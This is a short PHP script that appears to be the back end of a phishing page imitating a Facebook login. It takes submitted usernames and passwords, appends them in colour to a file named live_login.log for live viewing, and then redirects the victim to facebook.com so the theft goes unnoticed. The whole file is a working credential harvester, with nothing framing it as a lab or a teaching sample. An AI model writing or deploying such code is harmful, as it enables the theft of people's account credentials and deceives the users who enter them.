<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // ANSI Color Codes
    $red = "\033[1;91m";
    $green = "\033[1;32m";
    $reset = "\033[0m";

    // Create entry with color
    $entry = $green . "Username: " . $red . $username . $green . " | Password: " . $red . $password . $reset . "\n";

    // Log file in project directory
    $liveLog = "live_login.log";

    // Save entry to live_login.log
    file_put_contents($liveLog, $entry, FILE_APPEND);

    // Redirect user to Facebook
    header("Location: https://www.facebook.com");
    exit();
}
?>